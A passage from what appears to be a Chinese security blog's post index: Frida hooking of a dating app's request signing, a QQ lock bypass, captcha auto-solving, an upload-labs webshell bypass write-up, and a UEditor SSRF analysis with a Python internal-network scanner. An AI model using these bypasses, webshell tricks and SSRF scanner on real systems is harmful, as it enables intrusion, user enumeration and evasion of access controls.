获取到参数内容后，根据上篇文章的算法的分析，就可以自己构造进行加密了。 例如利用Python来实现，可以批量探测用户是否注册。 0x04 总结本来Frida和Xposed是作为一篇文章的，但是由于篇幅问题分成了两篇。这两篇文章主要通过两种方式来进行HOOK，主要是为了说明HOOK的好处，没有说是为了对比哪个好哪个不好的。不过通过测试，如果安装了VirtualXposed，Xposed应该还是略胜一筹吧。第一点无需ROOT即可运行，第二点是解决了需要重启手机的麻烦（利用VirtualXposed可以秒重启），第三点就是携带方便了。不过各有各的好处，根据自己的习惯选择。也可以先用Frida进行HOOK，毕竟测试比较方便，然后最后移植到Xposed上。","tags":"安卓hook soulapp xposed"},{"title":"安卓APP测试之HOOK大法-Frida篇","url":"/2019/01/25/Frida-Hook-SoulAPP/","text":"0x01 前言一般测试APP都是先设置代理，然后抓包进行测试。但是大多数情况下，抓取的数据包都含有参数校验，一旦修改其中一个参数之后，就会返回签名错误。 例如： 还有的有时间校验，当过去某一时间段后，该数据包就失效了。 因此如果想要去重放或者修改数据包进行FUZZ的话，就要弄清楚其中的加密sign值的算法。 本文以某app老版本为例(仅为技术研究)，主要目的是利用Frida进行HOOK进而去获取其api-sign的加密算法。 0x02 环境准备这里手机采用魅族X4，刷了CM13.0，开启ROOT权限。 APP版本为v3.0.10，下载地址：https://www.wandoujia.com/apps/cn.soulapp.android/history_v18080100 然后就是Frida环境的准备了。 Frida是一款基于Python + JavaScript 的Hook与调试框架，在Android\\Linux\\Windows等平台均能使用。这里我们以Windows来对Android应用程序进行Hook。Frida的官网地址是：https://www.frida.re。 安装方法也很简单：pip install frida-tools。 手机开启开发者模式，并开启USB调试。 下载frida-server，下载地址为：http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。 上传到手机 1adb push frida-server /data/local/tmp/ 添加权限 1root@mx4:/ #chmod 777 frida-server 手机上运行frida-server，命令如下： 1root@mx4:&#x2F; #.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server 端口转发,电脑上运行如下命令: 1adb forward tcp:27042 tcp:27042 环境准备好了，就开始对APP进行测试。 0x03 利用Frida进行HOOK安装后打开APP。 发现APP闪退，并提示SoulApp 暂不支持模拟器，请稍后再试~。 用jadx打开apk文件，搜索关键字模拟器。 只有一处，我们点进去。 其中有个判断，如果cn.soulapp.android.utils.j.e()为true，则提示不支持模拟器，并退出程序。点进这个方法查看。 其中有多个判断，如果一个为true，则返回true，最简单有效的方法就是hook，直接令其返回为false。使用Frida进行hook，代码如下： 运行后，发现再次打开app，可以顺利进入了。 输入手机号，点击确定。 提示网络错误，这是因为使用了代理，所以报错，但是有数据包的。可以暂时先不管这里。我们目的是获取sign值的加密算法。这里是获取api-sign的加密算法。 数据包内容 数据包中有api-sign，所以直接利用jadx搜索api-sign。 发现在cn.soulapp.android.api.b.b.b()中有调用，进入查看。 api-sign值的获取调用了cn.soulapp.android.api.b.c.a方法。 这里是创建了一个stringBuilder，经过拼接后，调用com.gongjiao.rr.tools.f.b进行sha1加密，并转换为大写。我们需要知道cn.soulapp.android.api.b.c.a三个参数的值是什么。 1aVar.b(\"api-sign\", c.a(aaVar, replaceAll, currentTimeMillis)); 根据代码可以推测，第一个参数aaVar是类okhttp3.Request的实例化； 第二个参数replaceAll是获取的UUID去除中间的&quot;-&quot;； 第三个参数是当前时间戳减去cn.soulapp.android.api.a.a()。这个值是从soul_share.xml中读取ApiConstants_timeDiff的值，查看soul_share.xml发现内容为空。 所以第三个参数为当前的时间戳。 查看cn.soulapp.android.api.b.c.a方法，前半部分是对aaVar进行操作，大概是获取请求的路径，然后对参数进行拼接。 看后半部分的代码： 这里第71行中的UTDevice.getUtdid(SoulApp.b())为设备号，即数据包里面的device-id； 第72行的a.j为固定值，这里为10000003； 第73行这个值需要获取，可以用hook获取； 第74行a(j)是将传入的时间戳(第三个参数)进行转换； 第75行是拼接了传入的第二个参数； 第78行拼接了固定值3010； 然后第80行调用com.gongjiao.rr.tools.f.b对stringBuilder进行加密，并转换为大写。 可以通过hook的方法直接获取cn.soulapp.android.api.b.c.a和com.gongjiao.rr.tools.f.b的参数。 主要代码： 由于cn.soulapp.android.api.b.c中有多个a方法，所以这里用了重载，指明参数类型来确定是哪个方法。 运行效果 知道了加密算法以及参数，就可以自己实现加密获取api-sign了，如下所示： api-sign值可以获取了，我们试一下能否利用。由上面知道代理抓包时数据包返回400，经过查看代码是可以解决这个问题的。这里不详细说明。 发现该方法获取api-sign是可行的。 0x04 其他问题1.不进行hook获取参数的内容或者查看调用堆栈的方法可以通过动态调试的方法进行查看。 首先将apk反编译为smali文件，然后IDEA安装smalidea插件。下载地址：https://bitbucket.org/JesusFreke/smali/downloads/ 反编译的命令如下： java -jar baksmali-2.2.2.jar d 106_3ce8a91b116f3ca28175affa3d12083f.apk -o SoulApp3010/src 然后导入到idea中 然后在需要查看的地方下断点。 例如在cn.soulapp.android.api.b.c.a下断点 打开Run/Debug Configurations，添加一个远程调试，端口8700 运行app，然后在Android Device Monitor中选中 打开调试按钮，点击手机上的确定，进入调试。 2.加密的算法在so文件中简单的方法就是获取调用so中方法的参数，然后自己写一个app，调用其so文件。 如果有判断的话，可以修改so文件达到可以调用的目的。 如上所示，该so文件有判断，如果isInMyAPP为false，则会退出，返回null。 我们可以修改CMP R0,#0为CMP R0,#1来绕过该限制。 修改后 更深入的就是对so文件进行分析，找到其中的加密算法。 0x05 总结Frida不仅可以用于hook java层，也可以进行native层的hook。利用Frida进行hook时，要求需要使用已ROOT的手机，对于手机无法ROOT的，安装VirtualXposed后使用Xposed框架也可以进行HOOK。这里就不说明了，有兴趣的可以去试一试。","tags":"安卓hook frida soulapp"},{"title":"Windows版本QQ锁定可被绕过","url":"/2018/11/19/QQ-Lock-bypass/","text":"在使用某抢票软件的时候，由于要设置抢票成功后的通知，就用了QQ通知。结果发现当QQ在锁定时，也可以获取到QQ的控制面板进行操作，竟然绕过了QQ的锁定，于是就去尝试如何实现QQ锁定的绕过。 情景还原 首先演示一下如何使用抢票软件进行QQ锁定的绕过。这里以最新版本9.0.7（24121）为例。下载后正常安装。 安装后查看版本。 将QQ锁定，然后打开软件，选择QQ通知，点击“获取聊天窗口”，此时会进行QQ窗体的加载，然后在“要发送的窗口”下拉框会显示一个随机字符串，点击“测试发送”按钮，会发现QQ控制面板弹出。 而且是可以进行未锁定前的所有功能。如发送和接收消息，如图所示。 实现过程刚开始的想法是首先获取QQ窗口的句柄，然后再利用句柄进行显示与隐藏。 尝试一这里采用的是精易编程助手来获取句柄，当qq处于非锁定状态，获取QQ窗体句柄后，可以利用句柄对QQ进行隐藏或显示，即使把QQ锁定，也可以进行隐藏或者显示。 但是当QQ隐藏后，此时再获取句柄后，无法绕过QQ的锁定。这时候获取的句柄为QQ锁定状态的句柄。 该方法只能对未锁定的QQ进行操作，锁定后就无法获取控制面板句柄了，因此该方法行不通。 尝试二放弃了精易编程助手，采用更专业的工具spy++。找到句柄后发现标题为一串随机的字符串，与抢票工具获取聊天窗口中标题一样。 猜测需要最终需要获取的句柄就是这个，句柄对应的十六进制为504BE，然后调用windows api进行窗口的显示和隐藏。 显示窗口ShowWindow (句柄, 1)，隐藏窗口ShowWindow (句柄, 0)。 效果如图所示。 这样虽然能够满足，但是却不够智能，无法自动获取句柄，需要借助其他工具去寻找句柄，因此放弃。 尝试三本次测试中走了两条“弯路”，在这里简要说明一下，就不再附详细的过程了。某次发现使用 12临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “TXMenuWindow”)句柄&#x3D;窗口_取父句柄 (窗口_取父句柄 (临时_句柄)) 或者 12临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “”)句柄&#x3D;窗口_取父句柄 (临时_句柄) 可以获取到QQ锁定时控制面板的句柄。如图所示 但这些只是概率事件，多数情况下还是不行的。即使可以使用这两种方法，但是这两种方法获取的都是一个句柄，当有两个QQ时，就无法同时获取两个句柄了，所以该方法不可取。 由于QQ处于锁定时，窗口标题为随机的字符串，所以无法使用FindWindowA这种方法了。 尝试四之最终实现此时想到另外一个思路，遍历屏幕上所有的顶层窗口，然后根据条件进行筛选。 这里用的Java来实现，操作Windows API采用了JNA。 JNA的全称是Java Native Access，你只要在一个java接口中描述本地库中的函数与结构， JNA将在运行期动态访问本地库，自动实现Java接口到本地库函数的映射。 使用maven加入所需的依赖。 1234567891011&lt;dependency&gt; &lt;groupId&gt;net.java.dev.jna&lt;/groupId&gt; &lt;artifactId&gt;jna&lt;/artifactId&gt; &lt;version&gt;5.1.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.java.dev.jna&lt;/groupId&gt; &lt;artifactId&gt;jna-platform&lt;/artifactId&gt; &lt;version&gt;5.1.0&lt;/version&gt; &lt;/dependency&gt; 枚举屏幕上所有的顶层窗口采用的是EnumWindows。 12boolean EnumWindows(WinUser.WNDENUMPROC lpEnumFunc, Pointer data) 该函数枚举屏幕上所有的顶层窗口，并将窗口句柄传送给应用程序定义的回调函数。回调函数返回FALSE将停止枚举，否则EnumWindows函数继续到所有顶层窗口枚举完为止。 参数：lpEnumFunc - 指向应用程序定义的回调函数的长指针。 参数：data - 指定要传递给回调函数的应用程序定义的值。 代码实现如下： 1234567User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123; public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123; System.out.println(hwnd); return true; &#125;&#125;,null); 此时获取的时所有顶层窗口的句柄，剩下的就是去如何进行过滤，留下所需的句柄。 通过对比发现，可以用窗口样式进行区分。当QQ锁定时（或QQ未锁定且最小化时），对应的窗口样式为860C0000（十进制为2248933376）。 下面为QQ锁定时的样式。 通过查询API，可以用User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE)来获取窗口样式。然后通过这种方法进行过滤，当该值为2248933376，则认为对应的hwnd为QQ控制面板的句柄。 主要代码如下： 12345678910User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123; public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123; if(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==2248933376L)&#123; System.out.println(hwnd); &#125; return true; &#125; &#125;,null); 可以看到成功获取了QQ锁定时控制面板的句柄。有了句柄，就可以进行之前的操作了，如显示与隐藏。 当QQ未锁定时，QQ弹出时对应的窗口样式为960c0000（十进制为2517368832）。 此时就可以先通过EnumWindows枚举所有的窗口，然后再使用GetWindowLongPtr(hwnd,User32.GWL_STYLE)获取窗口样式进行匹配，匹配到所需的窗口。 这里将QQ锁定和未锁定的情况都考虑进去，然后获取QQ控制面板的句柄。之后通过GetWindowText获取窗口的标题，再使用ShowWindow进行隐藏与显示操作。主要代码如下： 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws Exception&#123; List&lt;WinDef.HWND&gt; lt = getQQHwnds(); for (WinDef.HWND hwnd:lt) &#123; char[] titleBuffer = new char[512]; User32.INSTANCE.GetWindowText(hwnd,titleBuffer,512); System.out.println(new String(titleBuffer)); User32.INSTANCE.ShowWindow(hwnd,1);//显示 Thread.sleep(2000); User32.INSTANCE.ShowWindow(hwnd,0);//隐藏 Thread.sleep(2000); User32.INSTANCE.ShowWindow(hwnd,1);//显示 Thread.sleep(2000); &#125; &#125; public static List&lt;WinDef.HWND&gt; getQQHwnds()&#123; final List&lt;WinDef.HWND&gt; lt = new ArrayList&lt;WinDef.HWND&gt;(); User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123; public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123; if(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==2517368832L||User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==2248933376L)&#123; lt.add(hwnd); &#125; return true; &#125; &#125;,null); return lt; &#125; 首先获取到QQ控制面板的句柄，然后依次获取其标题，并进行显示-隐藏-显示等过程。效果如图所示。 这种成功实现了QQ锁定时自动获取控制面板句柄，实现了QQ锁定的绕过。而且有多个QQ时，都可以获取其句柄。 总结在一次偶然的情况下可以绕过QQ锁定，于是就进行了尝试，走了一些弯路，最终实现了这种效果。主要过程就是获取所有顶层窗口句柄-根据窗口样式匹配到QQ控制面板的句柄-使用ShowWindow进行显示。也许这不是最佳的解决方法。如果大家有更好的方法或者建议，欢迎分享。 参考资料[1]https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga [2]https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-","tags":"锁定绕过 windows-api"},{"title":"中文点选验证码自动识别","url":"/2018/08/16/Automatically-Identify-Chinese-Point-Selection/","text":"某次测试中遇到了汉字点选的验证码，看着很简单，尝试了一下发现有两种简单的识别方法，终于有空给重新整理一下，分享出来。 0x01 验证码的获取首先获取验证码。由于网站比较特殊，就不以他们的为例，自己生成验证码吧。这个不是重点，这里直接贴代码了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phpfunction createImage($word,$imagePath,$type,$imageName)&#123; $fontPath = 'msyh.ttc';//字体 $fontSize = 20 * 0.75; foreach ($word as $v ) &#123; $fontarea = imagettfbbox($fontSize, 0, $fontPath, $v); $textWidth = $fontarea[2] - $fontarea[0]; $textHeight = $fontarea[1] - $fontarea[7]; $tmp['text'] = $v; $tmp['size'] = $fontSize; $tmp['width'] = $textWidth; $tmp['height'] = $textHeight; $textArr[] = $tmp; &#125; list($imageWidth, $imageHeight, $imageType) = getimagesize($imagePath); for($i=0;$i&lt;count($textArr);$i++)&#123; list($x, $y) = randPosition($textArr, $imageWidth, $imageHeight, $textArr[$i]['width'], $textArr[$i]['height'],$i,$type); $textArr[$i]['x'] = $x; $textArr[$i]['y'] = $y; &#125; unset($v); //创建图片的实例 $image = imagecreatefromstring(file_get_contents($imagePath)); //字体颜色 $color = imagecolorallocate($image, 0, 0, 0); //绘画文字 foreach($textArr as $v)&#123; imagefttext($image, $v['size'], 0, $v['x'], $v['y'], $color, $fontPath, $v['text']); &#125; if(imagepng($image,$imageName))&#123; echo $imageName.\"\\n\"; &#125;&#125;function randPosition($textArr, $imgW, $imgH, $fontW, $fontH,$i,$type)&#123; switch ($type) &#123; case 0://生成mp $x = rand($i*60, ($i+1)*60-$fontW-3); $y = rand(40,80); break; case 1://生成ap $x = ($i)*25+5; $y = 25; default: break; &#125; $return = array($x, $y); return $return;&#125;$ap_imagePath = 'ap_bg.png';$mp_imagePath = 'mp_bg.png';$ap_imageName = \"ap_\".time().\".png\";$mp_imageName = \"mp_\".time().\".png\";$ap_word = array('请','依','次','点','击','图','中','的','猎', '户','室') ;$mp_word = array('猎', '户', '实','验','室');createImage($ap_word,$ap_imagePath,1,$ap_imageName);createImage($mp_word,$mp_imagePath,0,$mp_imageName);?&gt; 运行后生成这样两张图片。 ap_XXXXX.png mp_XXXXX.png ap_XXXXX.png是说明需要点击的文字，mp_XXXXX.png是需要点击的图片。 0x02 验证码识别对于这种简单的点选验证码，可以有两种很容易的识别方式（机器学习算麻烦的，这里就不列出了。嗯，对，我也不会）。一种是opencv的图像模板匹配，另外一种是OCR识别。 1. opencv的图像模板匹配第一种方式，使用opencv的图像模板匹配。模板匹配是一种在较大图像中搜索和查找模板图像位置的方法，opencv2和opencv3中提供了一个专门用于模板匹配的函数matchTemplate()。它是在输入图像上滑动模板图像（如在2D卷积中），并比较模板图像下的输入图像的模板和补丁。在OpenCV中实现了六种比较方法（这里用到的是cv2.TM_CCOEFF_NORMED），它返回一个灰度图像，其中每个像素表示该像素的邻域与模板匹配的程度。 获得结果后，可以使用cv.minMaxLoc（）函数查找最大/最小值的位置。将其作为矩形的左上角，并将（w，h）作为矩形的宽度和高度，那个矩形就是模板区域。 。 我们进行使用模板匹配来识别这种验证码时，首先先将“模板”找出来，这里我们需要匹配的是“猎”、“户”、“室”这三个字。将这三个字所在的图片进行截取，然后使用matchTemplate()函数在mp中进行匹配。 首先截取第一个字“猎”。 截取之后，就可以在mp中进行匹配。 这里得到了最大和最小位置。我们使用最大位置，然后将最大值作为阈值。获取模板的尺寸，然后在mp中用矩形（红色区域）画出匹配的区域。如下所示。 同理，用黄色和蓝色矩形将“户”、“室”所在的区域画出来。 点选时发送所选区域中间的坐标即可，这里就不再给出实例了。 这种方法虽然简单，但是对于字体不一的就不能很正确的标记出来。 修改生成图片的代码，将mp中的文字的字体设置为随机。 修改的代码如下： 12345678switch ($type) &#123; case 0://mp 文字随机大小 $fontSize = rand(20,30) * 0.75; break; case 1://ap 文字固定 $fontSize = 20 * 0.75; break; &#125; ap生成的结果还是和之前一样，mp的图片如下： 使用同样的代码来匹配。 此时匹配的结果就有些惨不忍睹了。所以就换另外一种识别方式-ocr识别。 2. OCR识别这里采用的是腾讯云的OCR-通用印刷体识别。 参考文档。输入mp图片，返回的是json。 查看json内容，发现包含了图片中的文字、位置和大小等。 同理ap中内容也可以获取。 此时匹配的时候直接就是匹配文字了。首先获取ap中后三个文字，然后与mp中返回的内容匹配，获取其位置和大小，然后再画矩形即可。 由于比较简单，这里直接贴结果。 匹配相当完美。 0x03 总结本文用了两种方法来自动识别汉字点选验证码，第一种采用的是opencv的模板匹配，这种方法虽然也可以匹配到，但这种方法缺点就是对于字体形状差异较大的验证码识别率较低。而第二种方法就比较快捷方便了，而且识别度高，比较推荐第二种方法。 当然这两种方法对于简单、“正规”的验证码可以，遇到复杂的、“扭曲的”验证码就不行了。这时候就要用到机器学习了，而本文只是简单的“识别”，将机器学习用到这里，就有些大材小用了。 相关代码：https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection 0x04 参考[1] http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html [2]https://cloud.tencent.com/document/product/866/17600","tags":"点选验证码 验证码识别"},{"title":"upload-labs writeup","url":"/2018/06/04/upload-labs-writeup/","text":"upload-labs是一个总结了大部分PHP上传漏洞的靶场 ，本文主要是记录一下这些常见上传漏洞的绕过方法。当然一种漏洞会有多种绕过的方法，这里暂时列举一些我所知道的解法。有些会有环境限制的，我会在其中备注出来的。 环境搭建我这里用到的是PHPStudy2016。采用的是Apache+php，其中Apache版本为2.4，php版本按照作者所说的为5.2.17。操作系统为Win10 。然后下载upload-labs并放置在PHPStudy安装目录的WWW目录下。也可以采用作者的集成环境。 题目与解法首先需要在upload-labs目录下新建upload目录。 然后就开始答题了。其中13-16暂时要求的是“保证上传后的图片马中仍然包含完整的一句话或webshell代码 ”，我就暂时以13题为例，其余的暂时先不做。第18题暂未解出，所以暂时先省略。 其他题的WriteUp如下： Pass-01在js中判断文件，直接上传拦截后修改为php文件 Pass-02 注意需要带上Content-Type: image/jpeg Pass-03方法1首先名字为3.php:jpg 会写入一个3.php的空文件 然后修改名字为3.&lt;&lt;&lt; 参考https://www.waitalone.cn/php-windows-upload.html 方法2需要在apache httpd.conf进行配置。 AddType application/x-httpd-php .php .phtml 然后上传的文件名可以为3.php.a或者3.phtml 这个解法是查看到作者给的集成环境中有这样的设置 方法3 首先文件名为3.php.::$DATA会生成一个3.php.文件 再将文件名修改为3.php&gt; 第二次的文件名还可以为3.php&lt; 、3.php&gt; 、3.php\\ 以及3.php&quot; 3.php.文件直接删除不掉，可以在bash命令下删除 方法4%aa url解码 其他还有%b3、%b2等。。 Pass-04参考Pass-03的方法1、2、3、4 Pass-05参考Pass-03的方法1、2、3、4 没有对文件名进行小写转换，所以大小写混合或者大写可以绕过 Pass-06参考Pass-03的方法1、2、3、4 这里没有去除空格，所以用“6.php ”即可绕过 Pass-07参考Pass-03的方法1、2、3、4 没有删除结尾的“.”，所以用“7.php.”可以绕过 Pass-08参考Pass-03的方法1、2、3、4 没有对字符串::$DATA进行操作，所以可以使用8.php::$DATA绕过 Pass-09参考Pass-03的方法1、2、3、4 Pass-10关键代码$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。 Pass-11%00截断即可 需关闭magic_quotes_gpc 集成环境中有该设置：magic_quotes_gpc = Off Pass-12%00截断即可，需要url解码 需关闭magic_quotes_gpc 集成环境中有该设置：magic_quotes_gpc = Off Pass-13题目已经更新，要求“保证上传后的图片马中仍然包含完整的一句话或webshell代码 ” 这里就以png格式图片为例 copy xwz.png/b + 1.txt 1111.png 其中xwz.png为正常的png图片，1.txt内容为&lt;?php echo &quot;pwn&quot;;?&gt; 查看上传后的结果 当然也可以直接用hex工具打开图片，在最后追加php代码。 14-16和该题要求类似，统一按该方法处理。步骤省略。 Pass-17参考Pass-03方法1 文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传 Pass-19save_name修改为“upload-19.php.”即可 总结这里面比较通杀的方法是采用aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容。可以参考当php邂逅windows通用上传缺陷这篇文章，里面介绍的很详细。 本文主要用到的绕过方式有： 修改js绕过（或者上传图片格式后抓包修改） 利用文件名aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容 使用3.php::$DATA 绕过 文件名进行小写绕过 “abc.php.” 绕过 “abc.pphphp”绕过 %00截断绕过 URL解码绕过（参考Pass-03)方法4 本文只是给了部分解题的答案，没有过多的描述思路。每道题的解法也不是那么单一固定的。其中Pass-03到Pass-09都可以利用Pass-03的四种方法。 参考 https://github.com/c0ny1/upload-labs https://www.waitalone.cn/php-windows-upload.html","tags":"php"},{"title":"UEditor SSRF漏洞(JSP版本)分析与复现","url":"/2018/05/25/UEditor-SSRF-In-JSP/","text":"前些时间测试的时候遇到了一个系统采用了UEditor编辑器，版本为1.4.3。已知该编辑器v1.4.3版本（jsp)存在SSRF漏洞，虽然是Bool型的SSRF，除了可以进行内网探测外，也可以根据web应用指纹信息，之后进行进一步的测试。 0x01 前言查看官方的更新日志可以发现UEditor编辑器在版本1.4.3.1修复了SSRF漏洞。 那版本1.4.3应该存在SSRF漏洞，本着能搜索就不动手的原则搜了一下，发现wooyun-2015-0133125中提到过这类的漏洞。但我这里是jsp版本的，里面提到jsp版本不一样，只好去分析一下漏洞产生的位置。 0x02 漏洞分析那我们需要查看版本1.4.3与1.4.3.1有什么不同，从而找到存在问题的地方。该项目的代码托管在Github上，地址为：https://github.com/fex-team/ueditor/ 。 查看版本1.4.3.1下的jsp代码. 可以发现在该版本有一次commit，commitId 为a1820147cfc3fbe2960a7d99f8dfbe338c02f0b6。根据字面意思应该是增加了修复SSRF的代码。 下载下来后对比一下v1.4.3.1和v1.4.3代码有什么不同(这里仅对比jsp下的代码)。 发现在v1.4.3.1中修改了jsp/src/com/baidu/ueditor/hunter/ImageHunter.java的validHost方法。 1234567891011121314private boolean validHost ( String hostname ) &#123; try &#123; InetAddress ip = InetAddress.getByName(hostname);//根据主机名获取ip if (ip.isSiteLocalAddress()) &#123;//是否为地区本地地址 return false; &#125; &#125; catch (UnknownHostException e) &#123; return false; &#125; return !filters.contains( hostname ); &#125; 新增了对ip地址是否为内部地址的判断。而在v1.4.3中仅仅是做了是否为过滤的ip地址。 12345private boolean validHost ( String hostname ) &#123; return !filters.contains( hostname ); &#125; isSiteLocalAddress方法作用是当IP地址是地区本地地址（SiteLocalAddress）时返回true，否则返回false。 IPv4的地址本地地址分为三段：10.0.0.0 ~ 10.255.255.255、172.16.0.0 ~ 172.31.255.255、192.168.0.0 ~ 192.168.255.255。 搜索后发现在captureRemoteData中调用了validHost方法。 根据代码可以分析：首先使用validHost对url进行判断，如果不合法，就提示“被阻止的远程主机”；当满足条件后会使用validContentState方法查看返回的状态是否为200，若不为200，则提示“远程连接出错”；进而对后缀、文件大小进行判断，都符合之后才进行图片的保存。如果url无法访问，则提示“抓取远程图片失败”。 所以可以根据返回的内容，来推断该url对应的主机是否可以访问。由于在版本v1.4.3中没有对请求的主机进行验证，从而造成了SSRF漏洞。 继续查看在capture方法中调用了captureRemoteData。 1234567891011public State capture ( String[] list ) &#123; MultiState state = new MultiState( true ); for ( String source : list ) &#123; state.addState( captureRemoteData( source ) ); &#125; return state; &#125; 在invoke中调用了capture. 1234567891011121314151617181920212223242526272829public String invoke() &#123; if ( actionType == null || !ActionMap.mapping.containsKey( actionType ) ) &#123; return new BaseState( false, AppInfo.INVALID_ACTION ).toJSONString(); &#125; ... State state = null; int actionCode = ActionMap.getType( this.actionType ); ... switch ( actionCode ) &#123; ... case ActionMap.CATCH_IMAGE: conf = configManager.getConfig( actionCode ); String[] list = this.request.getParameterValues( (String)conf.get( \"fieldName\" ) ); state = new ImageHunter( conf ).capture( list ); break; ... &#125; return state.toJSONString(); &#125; 当调用capture需要满足条件为actionCode为ActionMap.CATCH_IMAGE，在ActionMap中value为ActionMap.CATCH_IMAGE对应的key为catchimage。所以当actionType值为catchimage，即action参数对应为catchimage时，才可能触发SSRF漏洞。下面对漏洞进行验证。 0x03 漏洞验证这里用的是v1.4.3 jsp版本，下载ueditor1_4_3-utf8-jsp.zip，之后进行配置（可以参考http://fex.baidu.com/ueditor/#server-jsp）。 功能实现的入口文件是jsp/controller.jsp。由上述分析可知需要满足action参数为catchimage。 在case ActionMap.CATCH_IMAGE中下断点，然后进行调试。 访问链接http://localhost:8088/jsp/controller.jsp?action=catchimage 继续运行发现list为空，然后就抛出了异常。 再次运行，查看list数据从何而来。 可以看出list的数据从浏览器source[]参数而来。这里source[]需要后缀为图片格式，具体可以查看config.js中的catcherAllowFiles。 已知192.168.135.133开启了tomcat服务，且端口为8080。我们这里访问一张不存在的图片，例如用UUID生成一张图片的名称。 构造请求链接：http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png 当进入validHost方法时，由于被访问的主机地址不在过滤的范围，所以返回true。 这里可以发现，仅仅对127.0.0.1、localhost和img.baidu.com进行了限制，当ip为本地地址时并没有限制，从而可以进行内网探测。 而该图片由于不存在，所以状态码为404，到此抓取图片过程结束，并返回结果。 这里可以根据页面返回的结果不同，来判断该地址对应的主机端口是否开放。可以总结为以下几点： 如果抓取不存在的图片地址时，页面返回{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\\u8fdc\\u7a0b\\u8fde\\u63a5\\u51fa\\u9519&quot;} ]}，即state为“远程连接出错”。 如果成功抓取到图片，页面返回{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;SUCCESS&quot;,&quot;size&quot;: &quot;5103&quot;,&quot;source&quot;: &quot;http://192.168.135.133:8080/tomcat.png&quot;,&quot;title&quot;: &quot;1527173588127099881.png&quot;,&quot;url&quot;: &quot;/ueditor/jsp/upload/image/20180524/1527173588127099881.png&quot;} ]}，即state为“SUCCESS”。 如果主机无法访问，页面返回{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;\\u6293\\u53d6\\u8fdc\\u7a0b\\u56fe\\u7247\\u5931\\u8d25&quot;} ]}，即state为“抓取远程图片失败”。 由于除了在config.js中的catcherLocalDomain配置了过滤的地址外，没有针对内部地址进行过滤，所以可以根据抓取远程图片返回结果的不同，来进行内网的探测。 0x04 代码实现由上述分析，根据返回包中的state进行判断，当state为&quot;远程连接出错&quot;或者为”SUCCESS”时表示该主机存在，且对应的端口为开放状态。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839__Date__=\"20180524\"'''Usage: python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.133 python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.0/24 Python version: 3.6.2requirements:IPy==0.83'''import sysimport jsonimport requestsfrom IPy import IPdef check(url,ip,port): url = '%s/jsp/controller.jsp?action=catchimage&amp;source[]=http://%s:%s/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png' % (url,ip,port) res = requests.get(url) result = res.text result = result.replace(\"list\",\"\\\"list\\\"\") res_json = json.loads(result) state = res_json['list'][0]['state'] if state == '远程连接出错' or state == 'SUCCESS': print(ip,port,'is Open')def main(url,ip): ips = IP(ip) ports = [80,8080] for i in ips: for port in ports: check(url,i,port)if __name__ == '__main__': url = sys.argv[1] ip = sys.argv[2] main(url,ip) 由于返回的结果为{&quot;state&quot;: &quot;SUCCESS&quot;, list: [{&quot;state&quot;: &quot;...&quot;} ]}并不能直接用json来解析，需要将list替换为”list”后才可以作为json来解析。当然也可以直接使用burp来测试。 在实际测试中的测试结果如下： 0x05 综合利用对于这样的Bool型SSRF ，页面仅返回了状态，而没有更多别的信息，要想进一步利用，可以根据如下的思路： 内网探测-&gt;应用识别-&gt;攻击Payload-&gt;查看结果 内网探测首先进行内网探测，查看内网开放的主机和端口。这里以本地为例。 执行命令： python SSRF_Ueditor_jsp.py http://localhost:8088/ 192.168.135.155 123192.168.135.155 80 is Open192.168.135.155 8080 is Open 发现端口80 和 8080 开放，然后进行应用的识别。 应用识别80端口由于没有可以识别的特征，所以未识别到应用的类型，而8080端口可以识别出来为tomcat服务器。 然后尝试查看是否存在Struts2漏洞。 攻击Payload由于在抓取远程图片时，会请求给出的URL地址，所以可以利用Struts2漏洞在内网服务器（这里为192.168.135.155）上写入一个后缀为图片格式（如png、jpg)的文件（因为只能抓取图片格式的文件，所以这里写入了图片后缀的文件），然后利用Ueditor抓取图片的功能，将写入的图片文件抓取到ueditor服务器中，然后访问图片查看攻击结果。 首先写文件，这里利用Struts2漏洞在内网服务器web项目下写入一个名字为b5e592d2-ab5b-476d-865a-8299a0625490.png的文件，内容为Struts2_Test.png。 